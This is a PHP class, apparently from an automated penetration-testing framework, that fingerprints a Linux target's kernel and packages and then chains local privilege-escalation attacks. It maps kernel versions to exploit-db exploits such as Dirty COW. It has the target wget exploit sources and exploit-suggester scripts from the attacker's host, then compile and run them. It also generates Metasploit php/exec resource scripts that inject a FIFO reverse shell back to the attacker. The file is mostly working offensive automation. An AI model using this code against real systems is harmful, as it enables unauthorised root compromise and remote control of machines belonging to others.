<?php

class check4linux8exploits extends check4linux8misc{
    var $kernel_cve ;
    var $kernel_exploits ;
    var $kernel_msf ;
    var $kernel1 ;
    var $kernel2 ;
    var $kernel3 ;
    var $kernel4 ;
    var $os_plateforme_name ;
    var $os_kernel_number ;
    var $gdb_path ;
    
    /*
    
     */
    
    public function __construct($stream,$eth,$domain,$ip,$port,$protocol) {

        
        parent::__construct($stream,$eth,$domain,$ip,$port,$protocol);
        $this->kernel_cve = array();
        $this->kernel_exploits = array();
        // https://github.com/Ignitetechnologies/Privilege-Escalation/blob/master/Kernel%20Exploit.md
        $this->kernel_msf = array();
    }
    
    
    
    public function exploitdb2file4exec($ip, $port,$user2name, $user2pass,$files_list){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        if(!empty($files_list)){
            foreach ($files_list as $file){
                $file = trim($file);
                if(!empty($file)){
                    $obj_file = new FILE($file);
                    $obj_file->file_file2info();
                    $port_rev = $this->port_rfi+1;
                    $this->article("EXTENSION",$obj_file->file_ext);
                    switch ($obj_file->file_ext) {
                        case ($obj_file->file_ext=="c") :
                            $option_compile = $obj_file->req_ret_str("grep -i 'gcc' $obj_file->file_path  | grep -Po -i \"gcc *\" ");
                            //$this->requette("gedit $obj_file->file_path");
                            $this->article("OPT GCC",$option_compile);
                            $this->requette("cp -v $obj_file->file_path $this->dir_tmp/$obj_file->file_name$obj_file->file_ext ");
                            
                            $command = "wget http://".$this->ip4addr4target($this->ip).":$port_rev/$obj_file->file_name$obj_file->file_ext -O  ./$obj_file->file_name$obj_file->file_ext  && gcc -ggdb -w -std=c99 $option_compile ./$obj_file->file_name$obj_file->file_ext -o ./$obj_file->file_name.elf && chmod +x ./$obj_file->file_name.elf && echo 'id && exit' | ./$obj_file->file_name.elf | tee ./$obj_file->file_name.rst && cat ./$obj_file->file_name.rst && rm -v ./$obj_file->file_name.* ";
                            //$result .= $this->ssh($ip, $port,$user2name, $user2pass,$command);
                            break;
                            
                    }
                }
            }
        }
        return $result;
    }
    
    
    
    public function msf2exec($file_exploit,$target_ip,$target_port,$attacker_ip,$attacker_port){
        
        // set AutoRunScript multiconsolecommand -cl \"getsystem\",\"getuid\"
        // set AutoRunScript multi_console_command -rc $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc
        // set AutoRunScript post/linux/gather/enum_system
        //$query = "echo \"run post/linux/gather/enum_users_history\nrun post/linux/gather/enum_system\nrun post/linux/gather/enum_configs\nrun post/linux/gather/enum_network\nrun post/linux/gather/enum_protections\nrun post/linux/gather/hashdump\nrun post/linux/manage/sshkey_persistence\" > $this->dir_tmp/$this->ip.$this->port.post_linux.rc";
        //$this->requette($query);
        
        $this->ssTitre(__FUNCTION__);
        
        $cmd = "";
        $file_exploit = trim($file_exploit);
        
        if (!empty($file_exploit)){
            $tab_payloads = $this->service8msf8exploit2payloads($file_exploit);
            if ($this->flag_poc){
                $this->article("ALL Payloads",$this->tab($tab_payloads));
                $this->msf2info($file_exploit);
            }
            foreach ($tab_payloads as $payload){
                $payload = trim($payload);
                if (!empty($payload)){
                    
                    
                    switch ($payload){
                        case "php/exec" :
                            $this->service8msf8exploit2payload2options($file_exploit, $payload);$this->pause();
                            $cmd =<<<EOF
db_status
use $file_exploit
set RHOSTS $target_ip
set RPORT $target_port
set payload php/exec
set CMD %CMD%
run
exit
EOF;
                            break;
                    }
                    
                }
                
            }

            $hash = sha1($cmd);
            $this->str2file("", $cmd, "/tmp/$hash.rc");
            $query = "echo '$cmd' > /tmp/$hash.rc ;  msfconsole -q -r /tmp/$hash.rc 2> /dev/null " ;
            //$query = "msfconsole -q -x \"use $file_exploit; set RHOSTS $target_ip; set RPORT $target_port; set payload php/exec; set CMD \"%CMD%\"; run; exit\" 2> /dev/null " ;
            $this->pause();
            $this->article("msf>", $cmd);
            $this->pause();
            if (!empty($cmd)) return $query;
            else return $cmd;
        }
    }
    
    
    public function msf2search2exec($cve,$name,$platform,$app){
        $cve = trim($cve);
        
        $files_exploit = array();
        $this->ssTitre(__FUNCTION__);
        $shell = "/bin/bash";
        
        $attacker_ip = $this->ip4addr4target($this->ip);
        
        $files_exploit = array_filter($this->msf2cve($cve,$name,$platform,$app)) ;
        if (!empty($files_exploit)){
            foreach ($files_exploit as $file_exploit){
                if(!empty($file_exploit)){
                    $lport = rand(1024,65535);
                    $file_exploit = trim($file_exploit);
                    $this->article("EXEC $file_exploit", $cve);
                    $cmd_rev = $this->msf2exec($file_exploit,$this->ip,$this->port,$attacker_ip,$lport);
                    if (!empty($cmd_rev)){
                        $templateB64_shell = base64_encode(str_replace("%CMD%", "%SHELL%", $cmd_rev));
                        $lprotocol = 'T';
                        $type = 'server';
                        
                        $rev = $this->rev8fifo($attacker_ip, $lport, $shell) ; // OK Lampio
                        $cmd = str_replace("%CMD%", $rev, $cmd_rev);
                        $this->service4lan($cmd, $templateB64_shell, $lport, $lprotocol,$type);
                        
                    }
                    
                }
            }
        }
        
    }
    
    
    public function service8msf($exploit_rc,$lport,$lprotocol,$info,$type,$timeout) {
        // msfvenom -l payloads | grep "cmd/unix/" | awk '{print $1}'
        // cmd/unix/interact
        $type = strtolower(trim($type)) ;
        $cmd1 = "msfconsole -q -y /usr/share/metasploit-framework/config/database.yml -r $exploit_rc  2> /dev/null ";
        $cmd2 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol ".base64_encode($template)." server 30 listening_Server\" ";
        
        if ($type=="client") $this->exec_parallel($cmd1, $cmd2, 5);
        if ($type=="server") $this->exec_parallel($cmd2, $cmd1, 5);
    }
    
    
    public function service8msf8exploit2payloads($exploit){
        $exploit = trim($exploit);
        $rst = array();
        $query = "msfconsole -q  -x \"use $exploit;show payloads;exit;\" 2> /dev/null  | grep '/' | awk '{print $2}'";
        if (!empty($exploit)) return $this->req_ret_tab($query);
        else return $rst;
    }
    
    public function service8msf8exploit2payload2options($exploit,$payload){
        $exploit = trim($exploit);
        $payload = trim($payload);
        $query = "msfconsole -q -x \"use $exploit;set payload $payload;show options;exit;\" 2> /dev/null  ";
        if ( (!empty($exploit)) && (!empty($payload)) ) return $this->req_ret_str($query);
        else return "";
    }
    
    
    
    public function exploits8dpkg($stream){
        $this->ssTitre(__FUNCTION__);
        $app_name = "";
        $app_version = "";
        $prog_list = array();
        $data = "dpkg -l ";
        $tmp = $this->req_str($stream,$data,$this->stream_timeout,"");
        $tmpB64 = base64_encode($tmp);
        exec("echo '$tmpB64' | base64 -d | grep \"^ii\" | awk '{print $2 \"=\" $3 }'",$prog_list);
        
        if (!empty($prog_list)){
            $size = count($prog_list);
        for($i=0;$i<$size;$i++){
            $app = $prog_list[$i];
            $rst_version = array();
            $rst_name = array();
            if (!empty($app)){
                exec("echo '$app' | cut -d'=' -f2 | grep -Po \"^[0-9]{1,2}\.[0-9]{1,3}\" ",$rst_version);
                exec("echo '$app' | cut -d'=' -f1 | grep -Po \"^[a-z\-_]{1,}\" ",$rst_name);
                if(isset($rst_name[0])) $app_name = $rst_name[0];
                if(isset($rst_version[0])) $app_version = $rst_version[0];                
                $this->article("$i/$size App",$app_name);
                $this->article("Version",$app_version);
                if (!empty($app_name)) ;$this->exploits2file2exec($this->exploitdb("$app_name $app_version $this->os_plateforme_name"));
                unset($rst_name);unset($rst_version);
                
            }
        }
        }
        $this->pause();
    }
    
    
    public function parse4kernel($rst_uname_r){
        $this->ssTitre(__FUNCTION__);
        $kernel = array();
        $kernel1 = "";
        $kernel2 = "";
        $kernel3 = "";
        $kernel4 = "" ;
        //var_dump($rst_uname_r); $this->pause();
        
            if (preg_match('#(?<kernel1>[2-4]{1}).(?<kernel2>[0-9]{1,2}).(?<kernel3>[0-9]{1,3})-(?<kernel4>[[:print:]]{1,})#',$rst_uname_r,$kernel))
        {
            $kernel1 = intval($kernel['kernel1']);
            $kernel2 = intval($kernel['kernel2']);
            $kernel3 = intval($kernel['kernel3']);
            $kernel4 = $kernel['kernel4'];
            $this->article("The Main Kernel Version", $kernel1) ;
            $this->article("The Major Revision", $kernel2) ;
            $this->article("The Minor Revision", $kernel3) ;
            $this->article("The Minor Fix/Revision Detail", $kernel4) ;
        }
        return array($kernel1,$kernel2,$kernel3,$kernel4);
    }
    
    public function exploits8kernels4known($kernel1,$kernel2,$kernel3,$kernel4){
        $this->ssTitre(__FUNCTION__);
        $tab_exploits = array();
        
        
        if ($kernel1==2){
            if ($kernel2==6 && empty($kernel3)){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/8572.c";
                
            }
            if ($kernel2>=4 && $kernel2<=6 && empty($kernel3)){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/9479.c";
                
            }
            if ($kernel2>=4 && $kernel2<=6 && !empty($kernel3)){
                if ($kernel3 <= 22){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/6851.c";
                }
                if ($kernel3 <= 34){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/15944.c";
                }
                if ($kernel3 >= 27 && $kernel3 <= 36){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/15024.c";
                }
                if ($kernel3 <= 36){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/14814.c";
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/15285.c";
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/17787.c";
                }
                if ($kernel3 <= 37){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/15704.c";
                }
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/9545.c";
                
            }
            if ($kernel2>=6){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/18411.c";
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/17391.c";
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/40616.c";
            }
        }
        
        
        if ($kernel1==3){
            if ($kernel2==13 && empty($kernel3)){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/33824.c";
                
            }
            if ($kernel2==0){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/17391.c";
            }
            if ($kernel2<=9){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/40616.c";
            }
            if ($kernel2==13 && $kernel3<=19){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/37292.c";
            }
            if ($kernel2==14 && $kernel3==5){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/35370.c";
            }
            if ($kernel2<=8 && $kernel3<=9){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/37292.c";
            }
            
            if ($kernel2<=2){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/18411.c";
            }
            if ($kernel2>=19){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39166.c";
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39772.c";
            }
        }
        
        if ($kernel1==4){
            if ($kernel2<=3 && $kernel3<=3){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39166.c";
            }
            if ($kernel2==3 && $kernel3==3){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39230.c";
            }
            if ($kernel2==4){
                if ($kernel3==0){
                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/40871.c";
                $tab_exploits[] = "$this->dir_c/40847_adapted.cpp";

                $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39772.c";
                }
                if ($kernel3>=0 && $kernel3<=21){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/40049.c";
                }
                if ($kernel3==1){
                    $tab_exploits[] = "/opt/exploitdb/exploits/linux/local/39277.c";
                }
            }
        }
        var_dump($tab_exploits);
        return $tab_exploits;
    }
    
    
    public function exploits8kernels4suggest(){
        $this->ssTitre(__FUNCTION__);
        $kernel_exploits = array();
        $this->parse4kernel($this->os_kernel_number);
        
        if ( empty($this->os_kernel_number) && empty($this->os_plateforme_name)) return $kernel_exploits;
        $query = "searchsploit --colour \"$this->os_plateforme_name $this->os_kernel_number\" | grep -v \"/dos/\" | grep \"/local/\" | grep -i -E \"(priv|kernel|root|escalation)\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" ";
        $check = array();
        $check = $this->req_ret_tab($query);
        if (!empty($check)){
            $this->article("Exploits8exploitdb", $this->tab($check));
            return $check;
        }
        
       
        $query = "searchsploit --colour \"$this->os_plateforme_name $this->kernel1.$this->kernel2.$this->kernel3\" | grep -v \"/dos/\" | grep \"/local/\" | grep -i -E \"(priv|kernel|root|escalation)\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" ";
        $check = array();
        $check = $this->req_ret_tab($query);
        if (!empty($check)){
            $this->article("Exploits8exploitdb", $this->tab($check));
            return $check;
        }
        
        $query = "searchsploit --colour \"$this->os_plateforme_name $this->kernel1.$this->kernel2\" | grep -v \"/dos/\" | grep \"/local/\" | grep -i -E \"(priv|kernel|root|escalation)\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" ";
        $check = array();
        $check = $this->req_ret_tab($query);
        if (!empty($check)){
            $this->article("Exploits8exploitdb", $this->tab($check));
            return $check;
        }
        
        $query = "searchsploit --colour \"$this->os_kernel_number\" | grep -v \"/dos/\" | grep \"/local/\" | grep -i -E \"(priv|kernel|root|escalation)\" | grep -Po \"exploits/[[:print:]]{1,}$\"  | sed \"s#exploits/#/opt/exploitdb/exploits/#g\" ";
        $check = array();
        $check = $this->req_ret_tab($query);
        if (!empty($check)){
            $this->article("Exploits8exploitdb", $this->tab($check));
            return $check;
        }

        
return $kernel_exploits;
    }
    
    
    public function exploits($stream){
        
        /*
         wget https://raw.githubusercontent.com/wwong99/pentest-notes/master/scripts/xploit_installer.py
         USAGE: xploit_installer.py <exploit id>
         */

        $this->titre(__FUNCTION__);
       
        //return $this->exploits8dpkg();
        list($kernel1,$kernel2,$kernel3,$kernel4) = $this->parse4kernel($this->req_str($stream, "uname -r", 10, ""));
        $exploits8kernels4known = $this->exploits8kernels4known($kernel1,$kernel2,$kernel3,$kernel4);
        if (!$this->ip2root8db($this->ip2id)) $this->exploits2file2exec($stream, $exploits8kernels4known);
        
        
        if (!$this->ip2root8db($this->ip2id)) $this->exploits2exploit_suggester_2($stream);$this->pause();
        if (!$this->ip2root8db($this->ip2id)) $this->exploits2exploit_suggester_1($stream);$this->pause();
        //var_dump($this->kernel_exploits);
        $this->pause();
        
        $tmp = array();
        $filter = " | grep -v \"/dos/\" | grep -i -E \"(priv|kernel|root|escalation)\" ";
        foreach ($this->kernel_cve as $cve){
            if (!empty($cve))  {
                $cve = trim($cve);
                if ($cve=='CVE-2015-8660') {
                    $this->kernel_exploits[] =  "/opt/exploitdb/exploits/linux/local/39166.c";
                }
                // $tmp = $this->exploitdb($cve) ;
                // $result .= $this->cve8msf($cve);
                // if (!empty($tmp)) $this->kernel_exploits = array_merge($this->kernel_exploits,$tmp);
            }
        }
        
        $this->pause();
        $this->kernel_cve = array_unique($this->kernel_cve);
        if (!empty($this->kernel_cve)) rsort($this->kernel_cve);
        $this->article("CVE8all", "\n".$this->tab($this->kernel_cve));
        $platform = $this->ip2os4arch($this->ip2os());
        $app = "client";
        $tab_exp = array();
        foreach ($this->kernel_cve as $cve){
           // $tab_exp = array_merge($tab_exp,$this->msf2cve($cve,"",$platform,$app));
        }
                
        
        $exploits8kernels4suggest = $this->exploits8kernels4suggest();
        $kernel_exploits = array_unique($exploits8kernels4suggest);
        rsort($kernel_exploits); // ,$tab_exp
        //var_dump($this->kernel_exploits);
        $this->article("Exploits8all", "\n".$this->tab($kernel_exploits));
        //var_dump($this->kernel_exploits);

        $this->pause();
        
        if (!$this->ip2root8db($this->ip2id)) $this->exploits2file2exec($stream,$kernel_exploits);
        $this->pause();
    }
    
    
    
    public function exploits2file2exec($stream,$files_exploit){
        // https://github.com/Ignitetechnologies/Privilege-Escalation/blob/master/Kernel%20Exploit.md

        $this->ssTitre(__FUNCTION__);
        $template_id_euid = "";


        $files_exploit = array_filter(array_unique($files_exploit));
        //$files_exploit = array("/opt/exploitdb/exploits/linux/local/40847.cpp"); //
        //$files_exploit = array("/opt/exploitdb/exploits/linux/local/39166.c");
        
        
        
        if (!empty($files_exploit) && is_array($files_exploit) ){
            foreach ($files_exploit as $file_exploit){
                $file_exploit = trim($file_exploit);
                
                if( (!empty($file_exploit) && (!$this->ip2root8db($this->ip2id)) )){
                    
                    if(file_exists($file_exploit)){
                        $obj_file = new FILE($file_exploit);
                        $this->requette("grep -i -E \"(priv|kernel|root|escalation)\"  $obj_file->file_path");
                        
                        switch ($obj_file->file_name){
                            case "3" :                           
                            case "9542" :
                            case "26368" :
                            case "28718" :
                            case "37722" :
                            //case "40003" :
                            case "44298" :  // OK
                                $data = trim($this->exploit2file2compile($stream,"",$obj_file->file_path));
                                $template_id_euid = "$data '%ID%'";
                                break;

       
                                
                            case "17787" :
                                $data = trim($this->exploit2file2compile($stream,"-lrt",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                                
                            case "35370" :
                            case "40871" :
                            case "47170" :
                                $data = trim($this->exploit2file2compile($stream,"-lpthread",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                                
                            case "6851" :
                            case "8572" :
                            case "9479" :
                            case "9545" :                              
                            case "14814" :
                            case "15024" :
                            case "15285" :
                            case "15704" :
                            case "15944" :
                            case "17391" :
                            case "18411" :
                            case "26131" :
                            case "27297" :
                            case "33824" :
                            case "37292" : // OK typhon 1.02 10.60.10.143
                            case "39166" : // OK analoguepond 138
                            case "39230" :
                                $data = trim($this->exploit2file2compile($stream,"",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                            
                            case "39277" :
                            case "40003" :
                                $data = trim($this->exploit2file2compile($stream,"-lkeyutils",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                                
                            
                            case "40611" :
                                $data = trim($this->exploit2file2compile($stream,"-pthread",$obj_file->file_path));
                                $template_id_euid = "$data '%ID%'";
                                break;
                                
                            case "40616" :
                                $query = "cp $obj_file->file_path $obj_file->file_path.tmp ; sed -i 's/0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/\/* 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/g' $obj_file->file_path.tmp; sed -i 's/unsigned int sc_len = 177;/unsigned int sc_len = 177; *\//g' $obj_file->file_path.tmp; sed -i 's/0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/*\/ 0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,/g' $obj_file->file_path.tmp; sed -i 's/unsigned int sc_len = 136;/unsigned int sc_len = 136;\/*/g' $obj_file->file_path";
                                 $this->requette($query);
                                 $data = trim($this->exploit2file2compile($stream,"-pthread",$obj_file->file_path));
                                 $template_id_euid = "$data '%ID%'";

                                break;
                                
                            case "40838" :
                            case "40839" :
                                $data = trim($this->exploit2file2compile($stream,"-pthread -lcrypt",$obj_file->file_path));
                                $template_id_euid = "$data '%ID%'";
                                break;
                                

                            case "40847_adapted" :
                                $data = trim($this->exploit2file2compile($stream,"-pedantic -O2 -std=c++11 -pthread -lutil ",$obj_file->file_path));
                                //$template_id_euid = "python -c 'import pty; pty.spawn(\"/bin/bash\")' ; echo 'dirtyCowFun' |  $data -s ; %ID%";
                                $template_id_euid = "script -qc \"$data -c '%ID%' \" ";
                                break;
     
                            default:
                                $this->note("Default");
                                $data = trim($this->exploit2file2compile($stream,"",$obj_file->file_path));
                                $template_id_euid = "echo '%ID%' |  $data";
                                break;
                                
                        }
                        //if (!empty($template_id_euid)) $this->pentest8id($stream,$template_id_euid);
                        if (!empty($template_id_euid)) $this->pentest8id($stream,$template_id_euid);
                        
                    }
                }
            }
        }
        

    }
    
    
    
    public function exploits2exploit_suggester_1($stream){
        $this->ssTitre(__FUNCTION__);
        //
        if (!file_exists("$this->dir_tmp/linux-exploit-suggester.sh")) $this->requette("wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O $this->dir_tmp/linux-exploit-suggester.sh ");
        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/linux-exploit-suggester.sh -O /tmp/linux-exploit-suggester.sh";
        $this->req_str($stream,$data,$this->stream_timeout,"");

        $data = "bash /tmp/linux-exploit-suggester.sh --full";
        $lines_result = $this->req_str($stream,$data,$this->stream_timeout*10,"");
        
        $tab_exploits = array();
        $tab_sources = array();
        $tab_cve = array();
        
        exec("echo '$lines_result' | grep \"Download URL: https://www.exploit-db.com/download/\" | sed \"s#Download URL: https://www.exploit-db.com/download/##g\"  | awk '{print $1}' ",$tab_sources);
        
        if(!empty($tab_sources)){
            foreach ($tab_sources as $source){
                if (!empty($source)) 
                $tab_exploits[] = trim($this->req_ret_str("find /opt/exploitdb/exploits/ -iname \"$source.*\" -type f 2> /dev/null "));
            }
        }
        $this->pause();
        
        exec("echo '$lines_result' | grep -Po \"CVE-[0-9]{4}-[0-9]{4}\" ",$tab_cve);
        
        $this->kernel_exploits = array_unique($tab_exploits);
        $this->article("Exploits8exploit_suggester_1", "\n".$this->tab($this->kernel_exploits));
        
        $this->kernel_cve = array_unique($tab_cve);
        $this->article("CVE8exploit_suggester_1", "\n".$this->tab($this->kernel_cve));
        $data = "rm -v ./linux-exploit-suggester.sh ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
    }
    
    
    public function exploits2exploit_suggester_2($stream){
        $this->ssTitre(__FUNCTION__);
        if (!file_exists("$this->dir_tmp/linux-exploit-suggester-2.pl")) $this->requette("wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl -O $this->dir_tmp/linux-exploit-suggester-2.pl ");
        $data = "wget http://".$this->ip4addr4target($this->ip).":$this->port_rfi/linux-exploit-suggester-2.pl -O /tmp/linux-exploit-suggester-2.pl";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "perl /tmp/linux-exploit-suggester-2.pl | grep -i -E \"(CVE-|Source:)\" ";
        $lines_result = $this->req_str($stream,$data,$this->stream_timeout*10,"");
        $tab_exploits = array();
        $tab_sources = array();
        $query = "echo '$lines_result' | grep \"Source: http://www.exploit-db.com/exploits/\" | sed \"s#Source: http://www.exploit-db.com/exploits/##g\" | awk '{print $1}' ";
        //$tab_sources = $this->req_ret_tab($query);
        
        exec($query,$tab_sources);
        //$tab_sources = explode("\n", $this->tab($tab_sources_tmp)); 
        //$this->article("Sources", $this->tab($tab_sources));
        //var_dump($tab_sources);
        if(!empty($tab_sources)){
            foreach ($tab_sources as $source){
                if (!empty($source)) $tab_exploits[] = trim($this->req_ret_str("find /opt/exploitdb/exploits/ -iname \"$source.*\" -type f 2> /dev/null "));
            }
        }
        $this->pause();
        
        $tab_cve = array();
        $query = "echo '$lines_result' | grep -Po \"CVE-[0-9]{4}-[0-9]{4}\" ";
        //$tab_cve = $this->req_ret_tab($query);
        
        exec($query,$tab_cve);
        //$tab_cve = explode("\n", $this->tab($tab_cve_tmp)); 
        //$this->article("CVE", $this->tab($tab_cve));
        //var_dump($tab_cve);
        
        foreach ($tab_cve as $cve){
            $cve = trim($cve);
            if ($cve=='CVE-2015-8660') {
                $this->tab_cve_source[] = ["$cve" => "/opt/exploitdb/exploits/linux/local/39166.c"];
                $tab_exploits[] =  "/opt/exploitdb/exploits/linux/local/39166.c";
            }
        }
        

        $this->kernel_exploits = array_unique($tab_exploits);
        $this->article("Exploits8exploit_suggester_2", "\n".$this->tab($this->kernel_exploits));
        //var_dump($this->kernel_exploits);
        
        $this->kernel_cve = array_unique($tab_cve);
        $this->article("CVE8exploit_suggester_2", "\n".$this->tab($this->kernel_cve));
        //var_dump($this->kernel_cve);
        
        $data = "rm -v /tmp/linux-exploit-suggester-2.pl ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
    }
    
    
    
}
?>